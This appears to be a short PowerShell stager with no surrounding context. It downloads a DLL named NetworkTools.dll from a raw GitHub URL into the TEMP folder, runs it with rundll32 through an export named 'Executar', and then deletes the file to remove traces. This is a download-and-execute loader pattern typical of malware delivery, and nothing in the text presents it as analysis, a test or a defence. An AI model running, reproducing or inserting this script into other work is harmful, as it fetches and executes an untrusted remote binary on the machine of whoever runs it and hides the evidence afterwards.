$url = "https://raw.githubusercontent.com/Matheuskkal/yznrS/refs/heads/main/NetworkTools.dll"
$tempDll = "$env:TEMP\NetworkTools.dll"
Invoke-WebRequest -Uri $url -OutFile $tempDll
rundll32.exe $tempDll, Executar
Remove-Item $tempDll
